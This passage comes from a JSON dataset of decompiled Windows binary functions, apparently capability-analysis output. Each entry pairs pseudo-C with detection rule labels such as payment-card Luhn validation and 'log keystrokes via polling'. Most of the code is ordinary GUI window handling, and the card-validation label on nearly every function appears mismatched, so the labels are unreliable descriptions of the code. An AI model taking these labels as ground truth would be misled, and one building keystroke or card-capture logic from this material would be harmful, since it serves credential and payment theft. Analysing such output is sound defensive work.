      fcn.0040484c();\n        }\n    }\n    return cVar1;\n}\n",
        "token_count": 353
    },
    "00451988": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451988(uint param_1, int32_t param_2)\n\n{\n    uint uStack16;\n    \n    sub.user32.dll_GetCursorPos();\n    fcn.00450344();\n    *param_2 = param_2;\n    *(param_2 + 4) = uStack16;\n    return;\n}\n",
        "token_count": 75
    },
    "00451abc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00451abc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        (**(in_EAX + 0x38))();\n    }\n    return 0;\n}\n",
        "token_count": 84
    },
    "00452164": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452164(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = 0x451f04;\n    fcn.00451f10(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar4);\n    uVar3 = 0x453458;\n    uVar4 = 0x4533f0;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451f44(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x453428;\n    uVar4 = 0x4533d0;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451f44(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x453400;\n    uVar4 = 0x453418;\n    iVar1 = in_EAX;\n    iVar2 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451f44(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, iVar1, uVar3, iVar2);\n    uVar3 = 0x453440;\n    uVar4 = 0x4533e0;\n    iVar1 = in_EAX;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        fcn.00451f44(&stack0xfffffffc);\n    }\n    (**(*param_2 + 4))(uVar4, in_EAX, uVar3, iVar1);\n    return;\n}\n",
        "token_count": 520
    },
    "004523b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004523b8(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x51) & 0x10) == 0) {\n        if ((*(in_EAX + 0x48) < 0x8001) && (*(in_EAX + 0x4c) < 0x8001)) {\n            fcn.0043bb68(*(in_EDX + 10), *(in_EDX + 8));\n            fcn.0040484c();\n        }\n        else {\n            fcn.00451988();\n            fcn.0043bb68(var_4h, var_8h);\n            fcn.0040484c();\n        }\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00452c0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00452c0c(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = (**(*in_EAX + 0x58))(*param_2, param_2[1], param_2[2], param_2[3]);\n    if (iVar1 != 0) {\n        iVar1 = (**(*in_EAX + 0x58))();\n        iVar2 = fcn.00404528();\n        if (iVar1 != iVar2) {\n            iVar1 = (**(*in_EAX + 0x58))();\n            uVar3 = (**(iVar1 + 0x2c))();\n            fcn.0044fec8();\n            fcn.0044fe94();\n            fcn.00450198();\n            fcn.004501dc();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 225
    },
    "0045300c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045300c(uint param_1, int32_t param_2)\n\n{\n    double *in_EAX;\n    double *pdVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar2 = 0;\n    if (0 < param_2) {\n        iVar3 = 1;\n        pdVar1 = in_EAX;\n        do {\n            pdVar1 = pdVar1 + 1;\n            if (*pdVar1 < in_EAX[iVar2]) {\n                iVar2 = iVar3;\n            }\n            iVar3 = iVar3 + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return iVar2;\n}\n",
        "token_count": 174
    },
    "004534a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004534a4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    code **in_FS_OFFSET;\n    code *pcVar3;\n    code *pcStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        puStack40 = 0x4534bd;\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uStack44 = 0x4535be;\n    pcStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &fcn.004534a4::var_1h + 1;\n    var_1h._0_1_ = param_2;\n    fcn.0044f66c();\n    pcVar3 = fcn.0045525c;\n    uVar1 = fcn.00421004(fcn.0045525c, in_EAX);\n    *(in_EAX + 0x1c0) = uVar1;\n    uVar1 = fcn.00424d90();\n    *(in_EAX + 0x1a4) = uVar1;\n    fcn.00424f38();\n    *(in_EAX + 0x1dd) = 1;\n    *(in_EAX + 0x1d4) = 0xffffffff;\n    *(in_EAX + 0x1b8) = 3;\n    if (*(*0x4927e0 + 4) == 0x11) {\n        fcn.00405530();\n    }\n    else {\n        fcn.00444168();\n        fcn.00405584();\n    }\n    *(in_EAX + 0x1db) = 0;\n    *(in_EAX + 0x192) = *0x4535e4;\n    *(in_EAX + 0x193) = 2;\n    *(in_EAX + 0x194) = 1;\n    *(in_EAX + 0x198) = 1;\n    *(in_EAX + 0x158) = 1;\n    iVar2 = fcn.0045dc1c();\n    *(in_EAX + 0x1a0) = iVar2;\n    *(iVar2 + 0x1c) = in_EAX;\n    *(iVar2 + 0x18) = 0x4598f4;\n    *in_FS_OFFSET = pcVar3;\n    pcStack48 = 0x4535c5;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 644
    },
    "00453814": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453814(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    \n    *param_2 = *param_2 + *(*(in_EAX + 0x1a0) + 8);\n    param_2[1] = param_2[1] + *(*(in_EAX + 0x1a0) + 0xc);\n    param_2[2] = param_2[2] - *(*(in_EAX + 0x1a0) + 0x10);\n    param_2[3] = param_2[3] - *(*(in_EAX + 0x1a0) + 0x14);\n    return;\n}\n",
        "token_count": 166
    },
    "00453c24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453c24(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar1 = fcn.00458874();\n    if (cVar1 == '\\0') {\n        fcn.00418410();\n    }\n    else {\n        (**(*in_EAX + 0x44))();\n        *param_2 = var_8h;\n        param_2[1] = var_4h;\n    }\n    *param_2 = *param_2 - (*(in_EAX[0x68] + 8) + *(in_EAX[0x68] + 0x10));\n    param_2[1] = param_2[1] - (*(in_EAX[0x68] + 0xc) + *(in_EAX[0x68] + 0x14));\n    return;\n}\n",
        "token_count": 230
    },
    "00453db4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453db4(int32_t arg_8h)\n\n{\n    uint *in_ECX;\n    uint in_EDX;\n    uint arg_8h_00;\n    uint arg_ch;\n    uint *arg_10h;\n    uint var_18h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *in_ECX;\n    uStack16 = in_ECX[1];\n    uStack12 = in_ECX[2];\n    uStack8 = in_ECX[3];\n    arg_10h = &var_10h;\n    arg_ch = *(arg_8h + -8);\n    arg_8h_00 = 0;\n    fcn.00453c24();\n    fcn.00453844(arg_8h_00, arg_ch, arg_10h, in_EDX);\n    return;\n}\n",
        "token_count": 207
    },
    "004541a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004541a4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00404620();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    fcn.00450180();\n    iVar2 = fcn.00454658();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.0045461c();\n            if (*(iVar3 + 4) == *(in_EAX + 4)) {\n                fcn.0045461c();\n                fcn.00419730();\n                fcn.0044fe94();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar1 = *(iVar1 + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.00419888();\n            fcn.00451abc(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 325
    },
    "00454488": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454488(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    fcn.0040484c();\n    uVar3 = 1;\n    piVar4 = param_2;\n    fcn.00451abc(1);\n    uVar2 = 1;\n    fcn.00451abc(1);\n    fcn.004543f4(uVar2, uVar3, piVar4);\n    if ((*(param_2 + 7) & 2) == 0) {\n        fcn.00451abc(0);\n        fcn.00451abc(0);\n        fcn.00451abc(0);\n        fcn.00451abc(0);\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.00458874();\n            if (cVar1 != '\\0') {\n                (**(*param_2 + 0x80))();\n            }\n        }\n        else {\n            fcn.00451abc(0);\n            fcn.00455128();\n        }\n        fcn.004540e0();\n    }\n    fcn.00451abc(1);\n    return;\n}\n",
        "token_count": 297
    },
    "0045457c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045457c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    \n    uVar2 = 0;\n    piVar3 = param_2;\n    fcn.00451abc(0);\n    cVar1 = fcn.004047dc(uVar2, piVar3);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.00458874();\n        if (cVar1 != '\\0') {\n            fcn.00450c5c();\n        }\n    }\n    else {\n        fcn.004543d4();\n        (**(*param_2 + 0xb0))();\n    }\n    fcn.00454440();\n    fcn.00451abc(0);\n    fcn.00451abc(0);\n    fcn.0045419c();\n    return;\n}\n",
        "token_count": 209
    },
    "00454658": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00454658(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (*(in_EAX + 0x1cc) != 0) {\n        iVar1 = *(*(in_EAX + 0x1cc) + 8);\n    }\n    if (*(in_EAX + 0x1d0) != 0) {\n        iVar1 = iVar1 + *(*(in_EAX + 0x1d0) + 8);\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "004546e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004546e8(uint param_1, ushort param_2)\n\n{\n    fcn.00454678(param_2, 0, 0, 0);\n    return;\n}\n",
        "token_count": 46
    },
    "00454c34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454c34(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00452164();\n    uVar2 = 0x454ab4;\n    uVar1 = 0x454aec;\n    uVar3 = in_EAX;\n    fcn.00454b54(&stack0xfffffffc);\n    (**(*param_2 + 4))(uVar1, in_EAX, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 148
    },
    "00454f78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00454f78(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x454f8e;\n    fcn.0040484c();\n    puStack20 = 0x454f9b;\n    fcn.00459908();\n    uStack24 = 0x454fd4;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*in_EAX + 0xb0))();\n    fcn.00455128();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x454fdb;\n    uStack24 = 0x454fd3;\n    fcn.00459908();\n    return;\n}\n",
        "token_count": 210
    },
    "00455464": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "log keystrokes via polling"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00455464(int32_t param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t in_stack_fffffec4;\n    int16_t iStack300;\n    int16_t iStack298;\n    int32_t iStack296;\n    int32_t iStack292;\n    uchar auStack44 [4];\n    int32_t iStack40;\n    int32_t iStack36;\n    uint32_t uStack32;\n    uchar uStack28;\n    uint uStack24;\n    \n    sub.user32.dll_GetMessagePos();\n    uVar2 = fcn.0040773c();\n    iStack300 = uVar2;\n    iStack296 = iStack300;\n    iStack298 = uVar2 >> 0x10;\n    iStack292 = iStack298;\n    iStack36 = 0x4554a0;\n    fcn.00450344();\n    if (param_1 == 0) {\n        iStack36 = 0;\n        in_stack_fffffec4 = 0;\n        param_1 = fcn.004553a0(0, 0);\n    }\n    if (param_1 == 0) {\n        return 0;\n    }\n    iStack40 = in_stack_fffffec4;\n    if (in_EAX != param_1) {\n        iStack40 = in_stack_fffffec4 - *(param_1 + 0x40);\n        iStack36 = iStack36 - *(param_1 + 0x44);\n    }\n    uStack32 = *(param_2 + 8);\n    uStack24 = *(param_2 + 4);\n    uVar3 = *(param_2 + 10);\n    if (uVar3 < 0x201) {\n        if (uVar3 - 0xa1 < 2) {\ncode_r0x00455545:\n            uStack28 = 0;\n            goto code_r0x0045556b;\n        }\n        if (uVar3 - 0xa4 < 2) {\ncode_r0x00455559:\n            uStack28 = 1;\n            goto code_r0x0045556b;\n        }\n        uVar3 = uVar3 - 0xa7;\n    }\n    else {\n        if (uVar3 - 0x201 < 2) goto code_r0x00455545;\n        if (uVar3 - 0x204 < 2) goto code_r0x00455559;\n        uVar3 = uVar3 - 0x207;\n    }\n    if (uVar3 < 2) {\n        uStack28 = 2;\n    }\n    else {\n        uStack28 = 0;\n    }\ncode_r0x0045556b:\n    sub.user32.dll_GetKeyboardState(&stack0xfffffed8);\n    uVar1 = fcn.0043bc00();\n    uStack32._0_2_ = CONCAT11(uVar1, uStack32);\n    uStack32 = uStack32 & 0xffff0000 | uStack32;\n    uVar2 = fcn.00451abc(&stack0xffffffd4);\n    *(param_2 + 0xc) = uVar2;\n    return 1;\n}\n",
        "token_count": 744
    },
    "00455c8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00455c8c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0044d264();\n    if (iVar1 != 0) {\n        uVar2 = fcn.00451abc(*(param_2 + 8));\n        *(param_2 + 0xc) = uVar2;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 106
    },
    "00456138": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456138(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    int32_t *arg_ch;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_18h;\n    uint nSavedDC;\n    int32_t *nLeftRect;\n    uint hdc;\n    \n    puStack36 = 0x45614d;\n    nLeftRect = param_2;\n    hdc = in_EAX;\n    nSavedDC = sub.gdi32.dll_SaveDC();\n    uStack40 = 0x4561ce;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    sub.gdi32.dll_ExcludeClipRect(hdc, *nLeftRect + 2, nLeftRect[1] + 2, nLeftRect[2] + -2, nLeftRect[3] + -2);\n    fcn.00432198();\n    fcn.00432408();\n    arg_8h = 0;\n    arg_ch = nLeftRect;\n    fcn.00432198();\n    fcn.0043235c(arg_8h, arg_ch);\n    *in_FS_OFFSET = arg_8h;\n    sub.gdi32.dll_RestoreDC(hdc, nSavedDC, 0x4561d5);\n    return;\n}\n",
        "token_count": 331
    },
    "00456e58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456e58(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040484c();\n    fcn.0040484c(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 77
    },
    "00457f44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457f44(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_10h;\n    \n    if ((((in_EDX == in_EAX[0x10]) && (in_ECX == in_EAX[0x11])) && (arg_ch == in_EAX[0x12])) && (arg_8h == in_EAX[0x13])\n       ) {\n        return;\n    }\n    cVar1 = fcn.00458874();\n    if ((cVar1 == '\\0') || (iVar2 = sub.user32.dll_IsIconic(in_EAX[0x6d]),  iVar2 != 0)) {\n        in_EAX[0x10] = in_EDX;\n        in_EAX[0x11] = in_ECX;\n        in_EAX[0x12] = arg_ch;\n        in_EAX[0x13] = arg_8h;\n        cVar1 = fcn.00458874();\n        if (cVar1 != '\\0') {\n            var_2ch = 0x2c;\n            sub.user32.dll_GetWindowPlacement(in_EAX[0x6d], &var_2ch);\n            fcn.00450124();\n            sub.user32.dll_SetWindowPlacement();\n        }\n    }\n    else {\n        sub.user32.dll_SetWindowPos(in_EAX[0x6d], 0);\n    }\n    fcn.0044fd10();\n    fcn.0045339c();\n    (**(*in_EAX + 0x5c))();\n    return;\n}\n",
        "token_count": 398
    },
    "00458020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458020(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00454658(param_2, param_1);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.0045461c();\n            fcn.0040484c();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0045846c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045846c(void)\n\n{\n    int32_t in_EAX;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar auStack20 [16];\n    \n    puStack32 = &stack0xffffffec;\n    uStack24 = 0x45847b;\n    fcn.00450124();\n    uStack24 = 1;\n    uStack28 = 1;\n    sub.user32.dll_InflateRect();\n    sub.user32.dll_InvalidateRect(*(*(in_EAX + 0x30) + 0x1b4), &stack0xffffffe0, 0xffffffff);\n    return;\n}\n",
        "token_count": 146
    },
    "00458880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00458880(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack60;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    uStack76 = *(in_EAX + 0x1b4);\n    puStack80 = 0x458894;\n    iVar1 = sub.user32.dll_IsIconic();\n    if (iVar1 == 0) {\n        uStack84 = *(in_EAX + 0x1b4);\n        uStack88 = 0x4588ca;\n        puStack80 = &stack0xffffffb4;\n        sub.user32.dll_GetWindowRect();\n    }\n    else {\n        uStack60 = 0x2c;\n        puStack80 = &stack0xffffffc4;\n        uStack84 = *(in_EAX + 0x1b4);\n        uStack88 = 0x4588b1;\n        sub.user32.dll_GetWindowPlacement();\n        uStack84 = uStack40;\n        puStack80 = puStack36;\n        uStack76 = uStack32;\n        uStack72 = uStack28;\n    }\n    uStack88 = 0xfffffff0;\n    uStack92 = *(in_EAX + 0x1b4);\n    uStack96 = 0x4588d8;\n    uVar2 = sub.user32.dll_GetWindowLongA();\n    if ((uVar2 & 0x40000000) != 0) {\n        uStack96 = 0xfffffff8;\n        uStack100 = *(in_EAX + 0x1b4);\n        puStack104 = 0x4588ed;\n        iVar1 = sub.user32.dll_GetWindowLongA();\n        if (iVar1 != 0) {\n            sub.user32.dll_ScreenToClient();\n            sub.user32.dll_ScreenToClient();\n            iStack116 = iVar1;\n            puStack112 = &stack0xffffff9c;\n            iStack108 = iVar1;\n            puStack104 = &stack0xffffff9c;\n        }\n    }\n    *(in_EAX + 0x40) = iStack116;\n    *(in_EAX + 0x44) = puStack112;\n    *(in_EAX + 0x48) = iStack108 - iStack116;\n    *(in_EAX + 0x4c) = puStack104 - puStack112;\n    fcn.0044fd10();\n    return;\n}\n",
        "token_count": 637
    },
    "00458ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458ad0(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00454658();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0045461c();\n            if (*(iVar2 + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "00459b24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00459b24(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uStack16 = 0x459b35;\n    var_4h = in_EAX;\n    uStack16 = fcn.00458568();\n    puStack20 = 0x459b3b;\n    var_8h = sub.user32.dll_GetWindowDC();\n    uStack24 = 0x459b7a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*var_4h + 0xdc))();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x459b81;\n    uStack24 = var_8h;\n    uStack28 = 0x459b73;\n    uStack28 = fcn.00458568();\n    sub.user32.dll_ReleaseDC();\n    return;\n}\n",
        "token_count": 260
    },
    "00459b88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00459b88(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x459c21;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    (**(*in_EAX + 0x44))();\n    var_10h = var_10h + 2;\n    var_ch = var_ch + 2;\n    fcn.0042467c();\n    uVar1 = fcn.0045314c();\n    fcn.00450804(0xffffffff, &var_10h, uVar1 | 0x810);\n    uVar2 = fcn.004059dc();\n    uVar2 = fcn.00425694(uVar2);\n    sub.user32.dll_DrawTextA();\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x459c28);\n    return;\n}\n",
        "token_count": 278
    },
    "00459f2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00459f2c(void)\n\n{\n    int32_t *in_EAX;\n    uint var_10h;\n    \n    (**(*in_EAX + 0xe0))();\n    return;\n}\n",
        "token_count": 47
    },
    "00459f54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00459f54(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    fcn.00418438(arg_8h, 0);\n    uVar1 = fcn.0045314c();\n    uVar2 = fcn.004059dc(0xffffffff, arg_8h, uVar1 | 0xc10);\n    uVar2 = fcn.00425694(uVar2);\n    sub.user32.dll_DrawTextA(uVar2);\n    *(arg_8h + 8) = *(arg_8h + 8) + 6;\n    *(arg_8h + 0xc) = *(arg_8h + 0xc) + 2;\n    return;\n}\n",
        "token_count": 180
    },
    "0045a044": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045a044(int32_t *arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t lpRect;\n    int32_t var_14h;\n    uint lpPoint;\n    uint var_4h;\n    \n    sub.user32.dll_ClientToScreen();\n    sub.user32.dll_GetWindowRect();\n    *arg_8h = in_EDX - lpRect;\n    arg_8h[1] = in_ECX - var_14h;\n    return;\n}\n",
        "token_count": 120
    },
    "0045a44c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045a44c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x1c) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "0045b924": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
